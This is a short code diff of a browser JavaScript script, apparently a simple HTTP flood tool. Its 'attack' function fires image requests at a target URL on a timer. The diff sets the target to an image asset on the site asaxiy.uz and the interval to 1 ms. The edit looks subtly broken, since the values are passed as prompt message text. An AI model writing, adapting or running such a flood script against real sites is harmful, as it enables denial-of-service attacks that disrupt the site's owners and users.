@@ -1,6 +1,6 @@
-var target = prompt("Image Url, add / to the end");
-var speed = prompt("Make request ever [blank] miliseconds");
-var msg = prompt("Message to HTTP server");
+var target = prompt("https://assets.asaxiy.uz/brand/webp//5e15c4ec85cf2.webp");
+var speed = prompt("1");
+var msg = prompt("asaxiy.uz");
 
 function attack() {  
   var pic = new Image();
